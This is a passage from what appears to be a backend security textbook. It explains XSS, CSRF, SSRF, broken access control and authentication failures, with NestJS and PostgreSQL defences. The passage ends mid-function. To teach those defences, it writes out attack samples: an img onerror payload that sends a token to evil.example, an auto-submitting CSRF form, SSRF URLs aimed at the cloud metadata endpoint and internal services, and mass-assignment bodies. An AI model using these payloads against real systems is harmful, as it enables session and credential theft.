Mental model

Imagine a notice board in an office where anyone can pin a note. One day someone pins a note that says "Everyone who reads this: leave your keys on the desk." Nobody would obey a note. But browsers do obey scripts. Output encoding is the rule "notes are displayed in a glass case; they cannot be instructions". CSP is a guard that stops anyone acting on notes that did not come from management.

How it works

  1. The attacker submits POST /products/42/reviews with body: "Great! <img src=x onerror=\"fetch('https://evil.example/?c='+localStorage.token)\">".
  2. The API stores it. Validation checks length, not content.
  3. Another user opens the product page. The frontend inserts the review with innerHTML (or the mobile app's web view does). The onerror handler runs in the victim's origin and sends their access token to the attacker.
  4. With the token in localStorage, the attacker now is the victim until expiry (40.3). With an HttpOnly cookie, the script cannot read the credential, but it can still make requests as the user from within the page (the browser attaches the cookie), so the damage is bounded, not eliminated.

The fix has three layers:

  1. Output encoding at render time is the primary control and belongs to whoever renders: frontend, email templates, PDFs. Encode for the context (HTML body, attribute, URL, JavaScript string). Frameworks do this by default; audit the escape hatches.
  2. Sanitise rich text on input when the product genuinely needs HTML (a description with bold and links). Use an allow-list sanitiser (sanitize-html or DOMPurify with jsdom) on the server, store the sanitised result, and sanitise again on output if the renderer is not the one you control. Never write your own regex-based tag stripper.
  3. Content Security Policy as a backstop: a header that tells the browser which script sources are allowed. With script-src 'self' plus nonces, an injected inline <script> or onerror handler does not execute even if it reaches the DOM.

NestJS example

Sanitising a rich-text field in a DTO transform, and setting CSP with helmet.

TypeScript
// create-review.dto.ts
import { IsInt, IsString, Max, MaxLength, Min } from 'class-validator';
import { Transform } from 'class-transformer';
import sanitizeHtml from 'sanitize-html';

const RICH_TEXT = {
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
  allowedAttributes: { a: ['href'] },
  allowedSchemes: ['https'],                          // no javascript: or data: URLs
  transformTags: { a: sanitizeHtml.simpleTransform('a', { rel: 'noopener nofollow', target: '_blank' }) },
};

export class CreateReviewDto {
  @IsInt() @Min(1) @Max(5) rating: number;

  @IsString() @MaxLength(5000)
  @Transform(({ value }) => (typeof value === 'string' ? sanitizeHtml(value, RICH_TEXT) : value))
  body: string;                                       // stored already sanitised

  @IsString() @MaxLength(80)
  @Transform(({ value }) => (typeof value === 'string' ? sanitizeHtml(value, { allowedTags: [], allowedAttributes: {} }) : value))
  displayName: string;                                // plain text: strip everything
}
TypeScript
// main.ts: security headers with helmet, CSP tuned for an API + SPA
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],                          // no inline scripts, no eval; use nonces if you must inline
      styleSrc: ["'self'", "'unsafe-inline'"],        // often needed by CSS-in-JS; tighten if you can
      imgSrc: ["'self'", 'https://cdn.example.com', 'data:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],                     // clickjacking defense (replaces X-Frame-Options)
      baseUri: ["'self'"],
      formAction: ["'self'"],
    },
  },
  crossOriginEmbedderPolicy: false,                   // enable only if your assets support COEP
}));

For JSON APIs, also set Content-Type: application/json; charset=utf-8 (NestJS does) and X-Content-Type-Options: nosniff (helmet does), so a browser never renders an API response as HTML.

PostgreSQL example

The database stores what it is given; the only PostgreSQL angle is not being clever with it. A CHECK constraint rejecting <script is theatre; attackers use <img onerror>, SVG, or encoded forms. Store sanitised text and keep a raw copy only if there is a legal reason, in a column the API never returns.

SQL
CREATE TABLE product_reviews (
  id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  product_id  uuid NOT NULL REFERENCES products(id),
  user_id     uuid NOT NULL REFERENCES users(id),
  rating      smallint NOT NULL CHECK (rating BETWEEN 1 AND 5),
  body_html   text NOT NULL,           -- sanitised allow-list HTML
  created_at  timestamptz NOT NULL DEFAULT now()
);

Production scenario

A marketplace receives 3,000 reviews a day. Server-side sanitisation runs in about 0.5 ms per review. CSP is deployed in report-only mode first (Content-Security-Policy-Report-Only with a report-uri) for two weeks, which surfaces 14 legitimate inline scripts that must move to files, then enforced. CSP violation reports are collected at about 200 per day, mostly browser extensions; a spike on one page is the alert condition.

Failure scenario

A support-chat widget rendered customer messages with innerHTML so that links would be clickable. A customer's message contained an <img onerror> payload. Every support agent who opened the ticket executed it; the script called the internal admin API from the agent's browser (cookies attached) and exported the customer list. The API had no vulnerability at all; the agent's browser was the attacker. Fixes: encode messages and linkify safely; CSP with script-src 'self' on the support app; SameSite=Strict on the admin session cookie so a script running elsewhere cannot ride it.

Edge cases & failure modes

  • Rich text sanitised on input but the allow-list later widened (adding iframe or style) without re-sanitising stored content.
  • Sanitising on the client only; the API is callable without the client.
  • Markdown renderers that allow raw HTML.
  • SVG uploads (they can contain scripts) served from the main origin; serve user files from a separate origin (40.32).
  • JSON responses embedded into server-rendered HTML without </script> escaping.
  • Emails and PDFs generated from user data by a server-side template with escaping turned off.
  • X-XSS-Protection header: obsolete; CSP replaces it.
  • CSP with 'unsafe-inline' in script-src provides no XSS protection.

How a Senior Backend Engineer thinks about this

They classify every user-supplied text field as plain text (strip all HTML) or rich text (allow-list sanitiser with a named policy), and they never store raw HTML for rendering. They deploy CSP in report-only mode, fix what it finds, then enforce. They keep credentials out of script reach (HttpOnly) and they serve user-uploaded files from a separate origin so an uploaded SVG cannot become a same-origin script.

Common mistakes

  • Regex tag stripping.
  • Trusting the frontend to escape and shipping a mobile app with a web view that does not.
  • CSP that allows 'unsafe-inline' scripts.
  • Storing access tokens in localStorage on a site with any user content.

Interview questions

  1. Whose job is XSS prevention in an API + SPA architecture?
    Show answerHide answer
    Expected: shared; encode at render, sanitise rich text on input, CSP as backstop, token storage design.
  2. How does CSP mitigate stored XSS even if the payload reaches the DOM?
    Show answerHide answer
    Expected: inline and foreign scripts blocked; nonces for allowed inline.
  3. What can an XSS payload do if the session cookie is HttpOnly?
    Show answerHide answer
    Expected: still act as the user from within the page; cannot exfiltrate the cookie.
  4. How would you roll out CSP on a legacy site?
    Show answerHide answer
    Expected: report-only, collect, fix, enforce.

Practical exercise

Add server-side sanitisation to a reviews module and CSP via helmet in report-only mode. Submit reviews with ten payloads from the OWASP XSS cheat sheet. Acceptance criteria: stored bodies contain no event handlers, scripts, or javascript: URLs; a <b> tag survives; CSP reports arrive at your report endpoint for a test inline script; after two weeks the policy is switched to enforcing without breaking the app.

40.22 Cross-Site Request Forgery (CSRF)

Concept

CSRF tricks a logged-in user's browser into sending a request to your site that the user did not intend: a hidden form on an attacker's page that posts to https://bank.example/transfer. The browser attaches the user's cookies automatically, so the request arrives authenticated. The attacker cannot read the response; they only need the side effect.

CSRF exists only when the credential is attached automatically by the browser: cookies, and HTTP Basic auth. A bearer token in an Authorization header set by JavaScript is not attached to a cross-site form post, which is why token-in-header APIs are immune by construction.

Why does it exist?

Cookies were designed to be sent with every request to their domain, from any page. That was fine for 1995's web and is the whole problem for a modern app where a request has side effects. The fixes are all ways of proving that the request came from your page, not just from the user's browser.

Mental model

Imagine you have a standing arrangement with your bank: any letter with your address as sender is treated as yours. An attacker mails the bank a transfer form with your address as the return address. The bank obeys. The fix is a secret code word on each form that only you and the bank know (CSRF token), or the bank refusing letters that were not posted from your own mailbox (SameSite).

How it works

  1. The victim logs into app.example.com and gets a session cookie.
  2. The victim visits evil.example, which contains <form action="https://app.example.com/account/email" method="POST"><input name="email" value="attacker@evil.example"></form><script>document.forms[0].submit()</script>.
  3. The browser sends the POST with the victim's cookie. Without defenses, the email is changed and the attacker resets the password.

Defenses, in order of preference:

Defense How Notes
Bearer token in a header No cookie, no CSRF Header must be set by your JavaScript; then XSS becomes the concern (40.3)
SameSite=Lax (default in modern browsers) or Strict cookies Browser does not send the cookie on cross-site POSTs Lax still sends on top-level GET navigation; never mutate on GET
Synchroniser token Server issues a random token tied to the session; forms and AJAX must include it; server compares Classic; needs state per session
Double-submit cookie A random value in a cookie and the same value in a header/body; the attacker cannot read the cookie to copy it Stateless; must be signed or bound to the session to resist cookie injection from subdomains
Origin / Referer check Reject state-changing requests whose Origin header is not your site Cheap, effective backstop; some clients omit Origin
Custom header requirement Require X-Requested-With or a JSON content type; cross-site forms cannot set custom headers, and a JSON content type triggers a CORS preflight Strong for JSON APIs; not for form endpoints

For a NestJS API consumed by an SPA on the same site with cookie sessions: SameSite=Lax or Strict, plus a double-submit token bound to the session, plus an Origin check on all mutating methods, plus JSON-only bodies. The csurf package is deprecated; csrf-csrf (double-submit, signed) is a maintained alternative, or you write the 30 lines yourself.

NestJS example

A middleware that enforces Origin and a signed double-submit token on every non-safe method, exempting bearer-authenticated and webhook routes.

TypeScript
// csrf.middleware.ts
import { Injectable, NestMiddleware, ForbiddenException } from '@nestjs/common';
import type { Request, Response, NextFunction } from 'express';
import { createHmac, randomBytes, timingSafeEqual } from 'node:crypto';
import { ConfigService } from '@nestjs/config';

const SAFE = new Set(['GET', 'HEAD', 'OPTIONS']);

@Injectable()
export class CsrfMiddleware implements NestMiddleware {
  private readonly key: Buffer;
  private readonly allowedOrigins: Set<string>;
  constructor(cfg: ConfigService) {
    this.key = Buffer.from(cfg.getOrThrow<string>('CSRF_KEY'), 'base64');
    this.allowedOrigins = new Set(cfg.getOrThrow<string>('WEB_ORIGINS').split(','));
  }

  // token = random.hmac(random + sessionId): bound to the session, so a cookie injected by a sibling subdomain fails
  issue(res: Response, sessionId: string) {
    const rnd = randomBytes(16).toString('base64url');
    const mac = createHmac('sha256', this.key).update(`${rnd}.${sessionId}`).digest('base64url');
    res.cookie('__Host-csrf', `${rnd}.${mac}`, { httpOnly: false, secure: true, sameSite: 'strict', path: '/' }); // JS must read it to echo it
  }

  use(req: Request, res: Response, next: NextFunction) {
    if (SAFE.has(req.method)) return next();
    if (req.headers.authorization?.startsWith('Bearer ')) return next();        // header-auth clients are not CSRF-able
    const origin = req.headers.origin ?? (req.headers.referer ? new URL(req.headers.referer).origin : undefined);
    if (!origin || !this.allowedOrigins.has(origin)) throw new ForbiddenException('Bad origin');

    const cookie = req.cookies?.['__Host-csrf'] as string | undefined;
    const header = req.headers['x-csrf-token'] as string | undefined;
    const sessionId = req.sessionID;
    if (!cookie || !header || !sessionId || cookie !== header) throw new ForbiddenException('CSRF token missing');
    const [rnd, mac] = cookie.split('.');
    const expected = createHmac('sha256', this.key).update(`${rnd}.${sessionId}`).digest();
    const got = Buffer.from(mac ?? '', 'base64url');
    if (got.length !== expected.length || !timingSafeEqual(got, expected)) throw new ForbiddenException('CSRF token invalid');
    next();
  }
}

Apply it in AppModule with consumer.apply(CsrfMiddleware).exclude({ path: 'webhooks/(.*)', method: RequestMethod.ALL }).forRoutes('*'), and issue the token after login.

PostgreSQL example

No table is needed for double-submit tokens; that is the point of the design. If you use synchroniser tokens with a PostgreSQL session table (40.2), add a csrf_token column to sessions and rotate it on login.

Production scenario

A B2C web app on cookie sessions: SameSite=Lax blocks the classic attack in every modern browser; the double-submit token and Origin check cover old browsers and cookie-injection edge cases. Cost: one HMAC per mutating request, microseconds. The API's mobile clients use bearer tokens and skip the middleware entirely. CSRF rejections are logged; a spike from one origin means either an attack or a deploy that broke the frontend's token echo.

Failure scenario

A team moved the frontend to a new domain app.example.io and forgot to add it to WEB_ORIGINS. Every mutating request failed with 403 after deploy. Rolled back in six minutes; the lesson was to make WEB_ORIGINS part of the deployment checklist and to alert on 403-rate per route.

A different team "fixed" a CSRF finding by checking the token only on POST, leaving PUT and DELETE open. Attackers do not care which verb changes state.

Edge cases & failure modes

  • Mutations on GET (/logout?all=true), which SameSite=Lax does not protect.
  • SameSite=None for cross-site embedding, which reopens CSRF; then the token is mandatory.
  • Login CSRF: the attacker logs the victim into the attacker's account; protect the login form too.
  • Subdomain cookie injection defeating unsigned double-submit; use __Host- and sign.
  • CORS misconfiguration (Access-Control-Allow-Origin reflecting any origin with credentials) turns CSRF into full read access (40.26).
  • Webhooks and OAuth callbacks that must be exempt; exempt by explicit path list, never by "no token means skip".
  • File-upload multipart/form-data endpoints: simple requests without preflight; the token check still applies.

How a Senior Backend Engineer thinks about this

They first ask whether cookies are involved at all. If not, CSRF is a non-issue and they say so, in writing. If cookies are used, they layer SameSite, Origin checks and a bound token, exempt webhooks explicitly, and never allow state changes on GET. They test with a hostile HTML page, not by reading the code.

Common mistakes

  • Adding a CSRF token to a bearer-token API "because the scanner said so", and adding complexity for nothing.
  • Checking only POST.
  • Unsigned double-submit cookies with a Domain attribute.
  • Exempting a route "temporarily".

Interview questions

  1. Why is a bearer token in a header immune to CSRF?
    Show answerHide answer
    Expected: not attached automatically cross-site; custom headers force CORS preflight.
  2. SameSite=Lax vs Strict: what does each block and break?
  3. How does double-submit work and why must the cookie be signed or bound?
    Show answerHide answer
    Expected: attacker cannot read the cookie; unsigned cookies can be injected from subdomains.
  4. Does CORS prevent CSRF?
    Show answerHide answer
    Expected: no; CORS controls reading responses, not sending requests.

Practical exercise

Build a hostile HTML page that auto-submits a form to PATCH /account/email (with a hidden _method if your app honours it) and to POST /orders. Acceptance criteria: with the middleware enabled, both requests are rejected with 403 and the log shows the origin; the SPA's legitimate requests pass; the webhook route remains callable without a token; a request with a bearer token and no cookies passes.

40.23 Server-Side Request Forgery (SSRF)

Concept

SSRF makes your server send a request to a URL chosen by the attacker. The server has network access the attacker does not: to the cloud metadata endpoint (169.254.254.169, which hands out IAM credentials), to internal services with no authentication, to the database's admin port, to Redis. Any feature that fetches a URL supplied by a user (import from URL, avatar from URL, webhook target, PDF from a page, link preview) is an SSRF candidate.

Why does it exist?

"Fetch this URL for me" is a legitimate feature, and the internal network was built on the assumption that only trusted code makes requests from inside it. SSRF breaks that assumption: the trusted code is running, but the destination is hostile.

Mental model

Imagine a hotel concierge who will call any phone number a guest writes down. A guest writes the number of the hotel's internal safe room and says "tell them to open safe 12". The concierge, trusted inside the hotel, makes the call. The fix is a concierge who only dials external numbers, checks the number after the phone company resolves it, and refuses to follow forwarding to internal extensions.

How it works

  1. A user sets their avatar URL to http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role.
  2. The server fetches it, stores or displays the response, and the attacker reads temporary AWS credentials with the pod's role. On AWS, IMDSv2 (which requires a PUT with a token header first) blocks the naive version; not every cloud or every cluster enforces it.
  3. Variations: http://localhost:6379/ with a crafted path to inject Redis commands; http://10.0.3.14:9200/_cat/indices to read Elasticsearch; http://internal-admin/users/1/promote.
  4. Bypasses to expect: a public hostname that resolves to a private IP; DNS rebinding (first resolution is public and passes the check, second resolution at connect time is private); redirects from a public URL to a private one; decimal or octal IP forms (http://2130706433/ is 127.0.0.1); IPv6 forms ([::ffff:169.254.169.254]); file://, gopher:// schemes.

Defenses:

  1. Allow only http and https.
  2. Resolve the hostname yourself, check every resolved address against a block-list of private, loopback, link-local and metadata ranges, then connect to the checked IP (not the hostname again) while setting the Host header. This defeats rebinding.
  3. Do not follow redirects automatically; handle each hop with the same check, cap at 3.
  4. Timeouts (3 to 5 seconds), response size caps (a few MB), and a content-type allow-list.
  5. Better: send all user-directed outbound traffic through an egress proxy in its own network segment that has no route to internal services and whose allow-list is enforced centrally. Then application bugs cannot reach anything sensitive.
  6. On AWS, enforce IMDSv2 with a hop limit of 1 so containers cannot reach metadata through forwarding.

NestJS example

A SafeFetch service used by every user-directed fetch in the codebase.

TypeScript
// safe-fetch.service.ts
import { BadRequestException, Injectable } from '@nestjs/common';
import { lookup } from 'node:dns/promises';
import { isIP } from 'node:net';
import { Agent, fetch as undiciFetch } from 'undici';

const BLOCKED = [
  /^127\./, /^10\./, /^192\.168\./, /^172\.(1[6-9]|2\d|3[01])\./, /^169\.254\./, /^0\./, /^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./,
  /^::1$/, /^fc/i, /^fd/i, /^fe80/i, /^::ffff:(127|10|192\.168|169\.254)/i,
];
const isBlocked = (ip: string) => BLOCKED.some((re) => re.test(ip));

@Injectable()
export class SafeFetch {
  async get(rawUrl: string, hops = 0): Promise<{ contentType: string; body: Buffer }> {
    const url = new URL(rawUrl);
    if (!['http:', 'https:'].includes(url.protocol)) throw new BadRequestException('Unsupported scheme');
    if (url.username || url.password) throw new BadRequestException('Credentials in URL not allowed');

    // Resolve once; reject if ANY answer is private; then pin the connection to the checked address.
    const addresses = isIP(url.hostname) ? [{ address: url.hostname }] : await lookup(url.hostname, { all: true });
    if (addresses.length === 0 || addresses.some((a) => isBlocked(a.address))) throw new BadRequestException('Destination not allowed');
    const pinned = addresses[0].address;

    const agent = new Agent({
      connect: { lookup: (_h, _o, cb) => cb(null, [{ address: pinned, family: isIP(pinned) }]) }, // no second DNS lookup: defeats rebinding
      headersTimeout: 5000, bodyTimeout: 5000,
    });
    const res = await undiciFetch(url, { dispatcher: agent, redirect: 'manual', signal: AbortSignal.timeout(5000),
      headers: { 'User-Agent': 'example-fetcher/1.0' } });

    if (res.status >= 300 && res.status < 400) {
      const loc = res.headers.get('location');
      if (!loc || hops >= 3) throw new BadRequestException('Too many redirects');
      return this.get(new URL(loc, url).toString(), hops + 1);          // every hop re-validated
    }
    if (!res.ok) throw new BadRequestException(`Upstream ${res.status}`);
    const contentType = res.headers.get('content-type') ?? '';
    if (!/^image\/(png|jpeg|webp)/.test(contentType)) throw new BadRequestException('Unsupported content type');

    const chunks: Buffer[] = []; let size = 0;
    for await (const chunk of res.body!) {
      size += chunk.length;
      if (size > 5 * 1024 * 1024) throw new BadRequestException('Response too large');
      chunks.push(Buffer.from(chunk));
    }
    return { contentType, body: Buffer.concat(chunks) };
  }
}

PostgreSQL example

Store webhook targets and import URLs with their last validated resolution and a validation timestamp; re-validate before every use, because DNS changes.

SQL
CREATE TABLE outbound_webhooks (
  id               uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  tenant_id        uuid NOT NULL,
  url              text NOT NULL,
  last_resolved_ip inet,
  validated_at     timestamptz,
  disabled_reason  text,
  CONSTRAINT https_only CHECK (url LIKE 'https://%')
);

Production scenario

A CRM imports contacts from a customer-supplied URL, about 500 imports per hour. All user-directed fetches go through an egress proxy (Squid with an allow-list of public ranges) running in a subnet with no route to the VPC's internal services and no metadata access. The application-level SafeFetch check remains as defense in depth. Blocked destination attempts are logged with the tenant id; three tenants were suspended for repeated probes in a year.

Failure scenario

An "add a link preview" feature in a chat product fetched any URL to extract the title. An attacker posted http://169.254.169.254/latest/meta-data/iam/security-credentials/chat-app, received the temporary credentials in the preview text, and used them to list and download an S3 bucket of attachments. The pod's IAM role had s3:* on the bucket because "the app needs to read and write attachments". Fixes: IMDSv2 with hop limit 1, SafeFetch, egress proxy, and an IAM role limited to GetObject/PutObject on a prefix.

Edge cases & failure modes

  • DNS rebinding between check and connect; pin the IP.
  • Redirect to a private address; validate every hop.
  • IPv6 and mapped addresses; block-list must cover them.
  • Hostnames like localtest.me or *.nip.io that resolve to whatever the name encodes.
  • Protocol smuggling via gopher:// or dict:// in libraries that support them; allow-list schemes.
  • Slow-drip responses to hold connections; body timeout and size cap.
  • Internal services trusting any request from inside the VPC; add authentication to internal services regardless (40.19).
  • PDF and image libraries that fetch URLs embedded in the input (SVG <image href>, HTML-to-PDF with external CSS); run them with networking disabled or behind the proxy.

How a Senior Backend Engineer thinks about this

They inventory every place the server makes a request whose destination is influenced by input, including indirect ones like PDF renderers. They route those through one hardened client and, where the budget allows, an egress proxy with no internal routes. They enforce IMDSv2 and least-privilege IAM so a successful SSRF finds nothing worth stealing. They add authentication to internal services because "internal" is a network position, not a trust level.

Common mistakes

  • Checking the hostname string against localhost and 127.0.0.1 only.
  • Following redirects automatically.
  • Resolving DNS twice (once to check, once to connect).
  • Wide-open IAM roles on pods.
  • Forgetting non-obvious fetchers (image processors, link previews, PDF engines).

Interview questions

  1. What is SSRF and why is the cloud metadata endpoint the classic target?
    Show answerHide answer
    Expected: server reaches internal network; metadata hands out credentials.
  2. How do you defeat DNS rebinding?
    Show answerHide answer
    Expected: resolve, check all addresses, pin the connection to the checked IP.
  3. Why is an egress proxy a stronger control than application checks?
    Show answerHide answer
    Expected: network isolation does not depend on every code path being correct.
  4. What IAM and IMDS settings limit the damage of an SSRF?

Practical exercise

Implement SafeFetch and route all URL fetches through it. Write tests with: http://169.254.169.254/, http://2130706433/, a hostname you control that resolves to 10.0.0.1, a public URL that redirects to http://localhost:6379/, and a 50 MB response. Acceptance criteria: all five are rejected; a legitimate https:// image fetch succeeds; the connection is made to the checked IP (verify with a DNS mock that resolves differently on the second call).

40.24 Broken Access Control

Concept

Broken access control is OWASP's number one category, and it is a family rather than a single bug: IDOR (40.12), missing function-level checks (an admin endpoint with no role guard), mass assignment (a request body that sets fields the user should not control), privilege escalation through a role in the request body, and metadata manipulation (editing a JWT claim, a hidden form field, or a cookie value). What they share: the server did the work it was asked to do without asking whether the caller was allowed to ask.

Why does it exist?

Authorization is per-endpoint logic written by many people over years. Every new field, endpoint, and role is a chance to forget. Frameworks cannot know your business rules, so they cannot enforce them by default. What they can do is make the safe path the default: global guards, whitelisted DTOs, and repositories that require a principal.

Mental model

Imagine a hotel where the reception desk is strict but housekeeping leaves every door propped open, the minibar restocking form lets guests write their own price, and the "upgrade to suite" form is on the website with no check of who submits it. Each door, form, and field is an access-control decision.

How it works

Exploit examples against a NestJS app:

  1. Missing function-level check: DELETE /admin/users/:id exists in AdminController with @UseGuards(JwtAuthGuard) but the developer forgot RolesGuard. Any logged-in user can delete users.
  2. Mass assignment: PATCH /users/me accepts UpdateUserDto but the service does Object.assign(user, body). The attacker sends { "displayName": "x", "roles": ["admin"], "emailVerified": true, "balanceCents": 999999 }. Without a DTO whitelist, every property lands on the entity.
  3. Privilege escalation via body: POST /auth/register with { "email": ..., "password": ..., "role": "admin" } and a DTO that has an optional role property "for the admin creation flow".
  4. Nested mass assignment: { "address": { "id": "<someone else's address id>", "line1": "..." } } where the service upserts the nested object by id, moving another user's address into this user's account.

Fixes:

  1. Global guards with explicit @Public() (40.37); a test that walks every route.
  2. ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true }) globally. Unknown properties are rejected, not silently dropped, so an attacker probing for hidden fields gets a 400 and you get a log line.
  3. Separate DTOs per audience: UpdateProfileDto for users has no roles; AdminUpdateUserDto has roles and lives behind @Roles('admin').
  4. Never Object.assign(entity, body); copy allowed fields explicitly, or use the DTO class as the only source.
  5. Nested objects: validate with @ValidateNested() and @Type(() => AddressDto), and never trust ids inside nested objects; look up by (id, ownerId).

NestJS example

TypeScript
// main.ts
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,              // strip properties without decorators
  forbidNonWhitelisted: true,   // ...and reject the request instead of silently stripping
  transform: true,              // plain body -> DTO class instance (enables nested validation)
  forbidUnknownValues: true,
}));
TypeScript
// update-profile.dto.ts: what a USER may change about themselves. No roles, no email, no balance.
export class UpdateProfileDto {
  @IsOptional() @IsString() @Length(1, 80) displayName?: string;
  @IsOptional() @IsString() @Length(0, 500) bio?: string;
  @IsOptional() @ValidateNested() @Type(() => AddressInputDto) address?: AddressInputDto;
}
export class AddressInputDto {
  // Note: no `id`. The server decides which address row belongs to the caller.
  @IsString() @Length(1, 120) line1: string;
  @IsString() @Length(1, 60) city: string;
  @IsString() @Length(2, 2) country: string;
}

// users.service.ts
async updateProfile(userId: string, dto: UpdateProfileDto) {
  const user = await this.repo.findOneByOrFail({ id: userId });
  if (dto.displayName !== undefined) user.displayName = dto.displayName;   // explicit field copy
  if (dto.bio !== undefined) user.bio = dto.bio;
  if (dto.address) await this.addresses.upsertForUser(userId, dto.address); // owner-scoped upsert
  return this.repo.save(user);
}

PostgreSQL example

Column-level grants make certain escalations impossible even if the code is wrong:

SQL
-- The API role can update profile columns but not privilege columns; role changes go through a separate admin path/role.
GRANT SELECT ON users TO svc_api;
GRANT UPDATE (display_name, bio, password_hash, tokens_invalid_before, updated_at) ON users TO svc_api;
-- No UPDATE on users.status, no INSERT/DELETE on user_roles for svc_api.
GRANT INSERT, DELETE ON user_roles TO svc_admin;

An Object.assign bug that tries to write status now fails with a permission error and a log line instead of a silent escalation.

Production scenario

A SaaS with 400 endpoints. The route-walker test runs in CI and fails when a new controller lacks the expected guards. forbidNonWhitelisted rejections are logged with the property names; a spike of roles, isAdmin, balance in rejected properties is a reliable signal that someone is probing. The team sees one or two such probes a week from bug-bounty researchers and occasionally from real attackers.

Failure scenario

A "wallet" feature stored balance_cents on the users row. PATCH /users/me used repo.merge(user, body) before a DTO was added. A user set their own balance to ten million cents and bought a laptop. The investigation found the pattern in six other endpoints. The fix was the global ValidationPipe with whitelist and a rule that money never lives on a row the user can patch.

Edge cases & failure modes

  • @IsOptional() on a sensitive field in a shared DTO.
  • transform: true without @Type() on nested arrays, leaving nested objects unvalidated.
  • Query DTOs (@Query()) forgotten; the pipe applies to them too if declared as classes.
  • GraphQL or WebSocket handlers bypassing the HTTP pipe.
  • Bulk endpoints that apply changes to ids from the body without ownership filtering.
  • Admin impersonation features ("view as user") that do not downgrade permissions.

How a Senior Backend Engineer thinks about this

They make it structurally hard to be wrong: global validation with whitelist, per-audience DTOs, guards by default, column grants for privilege fields, and CI tests that enumerate routes and reject unknown properties. They keep money and privilege on rows and columns the user's role cannot write. They treat every "temporarily optional" field in a DTO as a future incident.

Common mistakes

  • One DTO shared by users and admins.
  • whitelist: true without forbidNonWhitelisted, hiding probes.
  • Spreading request bodies into entities.
  • Guards on controllers, not globally.

Interview questions

  1. What is mass assignment and how does NestJS prevent it?
    Show answerHide answer
    Expected: ValidationPipe whitelist and per-audience DTOs.
  2. How do you guarantee every route is guarded?
    Show answerHide answer
    Expected: global APP_GUARD with @Public(), route enumeration test.
  3. Give three forms of broken access control other than IDOR.
  4. How can PostgreSQL grants back up application authorization?

Practical exercise

Enable the global ValidationPipe with whitelist and forbid options. Send { "roles": ["admin"] } to every PATCH and POST endpoint in a project. Acceptance criteria: every request returns 400 with the offending property named; the route-walker test passes; column grants prevent svc_api from updating users.status.

40.25 Authentication Failures

Concept

This category covers everything that lets an attacker become someone else without breaking cryptography: credential stuffing (replaying leaked email/password pairs), brute force (guessing passwords or codes), weak password reset (guessable tokens, tokens that never expire, reset links that leak), user enumeration (different messages or timings for "wrong password" and "no such user"), and missing lockouts and rate limits.

Why does it exist?

Login is the most-attacked endpoint on any site because it is public, standardised, and the prize is an account. Attackers run credential stuffing at internet scale using botnets and residential proxies; a success rate of 0.5 percent on a million attempts is 5,000 accounts.

Mental model

Imagine a building with one public door. The attacker has a bag of ten thousand keys stolen from other buildings and tries each one. A doorman who lets them try all day is the vulnerability. A doorman who pauses after five wrong keys, notices the same person trying at every door, and never says "that key is for the wrong door, try again" is the fix.

How it works

Exploit examples:

  1. Credential stuffing: 2 million leaked pairs replayed at 200 requests per second from 5,000 IPs. No per-IP limit triggers because each IP sends a few requests. Detection needs per-account failure counts and global failure rate.
  2. Enumeration: POST /auth/login returns "No account with that email" vs "Wrong password"; POST /auth/register returns "Email already registered"; POST /auth/forgot returns "We sent an email" only for existing accounts and responds 40 ms faster otherwise (no hashing). Each leaks which emails are customers.
  3. Weak reset: the token is a 6-digit code with no rate limit; or the token is base64(userId + timestamp); or the reset link is GET and the token ends up in the referrer of the analytics script loaded on the reset page.

Fixes:

  1. Rate limiting in layers: per IP (@nestjs/throttler, 20 per minute on /auth/*), per account (5 failures per 15 minutes, then a progressively longer delay or a captcha), and global (alert when the login failure rate exceeds 3x baseline).
  2. Account lockout that does not become a DoS: never hard-lock on failures alone (an attacker can lock every user out). Use exponential delays, captcha after N failures, and notify the user; hard-lock only with a self-service unlock via email.
  3. Uniform responses: "Invalid email or password" for every login failure; "If that email exists, we sent a link" for reset; on registration, send an email to the existing address ("someone tried to register with your email") and return the same success response.
  4. Uniform timing: always run the password hash (dummy hash for unknown users, 40.14).
  5. Reset tokens: 32 random bytes, stored hashed, 15-minute expiry, single use, bound to the user, invalidated when a new one is issued or on login; the reset page must not load third-party scripts, and the token is submitted via POST. Changing the password invalidates all sessions and refresh tokens and sends a notification.
  6. Breached-password check at registration and password change (Have I Been Pwned range API with k-anonymity).
  7. Notifications: new device login, password changed, MFA disabled. Users are your best intrusion detection.

NestJS example

Layered limits with @nestjs/throttler for IP and a Redis counter for accounts, plus a uniform-response password reset.

TypeScript
// app.module.ts: per-IP throttling with Redis storage so limits are shared across pods
ThrottlerModule.forRootAsync({
  inject: [ConfigService],
  useFactory: (cfg: ConfigService) => ({
    throttlers: [{ name: 'default', ttl: 60_000, limit: 100 }],
    storage: new ThrottlerStorageRedisService(cfg.getOrThrow('REDIS_URL')), // from @nest-lab/throttler-storage-redis
  }),
}),
providers: [{ provide: APP_GUARD, useClass: ThrottlerGuard }]
TypeScript
// auth.controller.ts
@Controller('auth')
export class AuthController {
  constructor(private auth: AuthService) {}

  @Public()
  @Throttle({ default: { limit: 10, ttl: 60_000 } })   // stricter on auth routes
  @Post('login')
  @HttpCode(200)
  login(@Body() dto: LoginDto, @Req() req: Request) {
    return this.auth.login(dto.email, dto.password, { ip: req.ip!, userAgent: req.headers['user-agent'] });
  }

  @Public()
  @Throttle({ default: { limit: 5, ttl: 60_000 } })
  @Post('forgot-password')
  @HttpCode(202)
  async forgot(@Body() dto: ForgotPasswordDto) {
    await this.auth.requestPasswordReset(dto.email);     // does the same amount of visible work either way
    return { message: 'If that email exists, we sent a reset link.' };
  }
}
TypeScript
// auth.service.ts (account-level failure tracking)
async login(email: string, password: string, meta: { ip: string; userAgent?: string }) {
  const failKey = `login:fail:${email.toLowerCase()}`;
  const failures = Number((await this.redis.client.get(failKey)) ?? 0);
  if (failures >= 5) {
    // Progressive delay instead of hard lock; captcha required by the client above 5.
    throw new HttpException({ code: 'TOO_MANY_ATTEMPTS', retryAfterSeconds: 60 * 2 ** Math.min(failures - 5, 6) }, 429);
  }
  const user = await this.users.verifyCredentials(email, password);   // dummy-hash timing when unknown
  if (!user) {
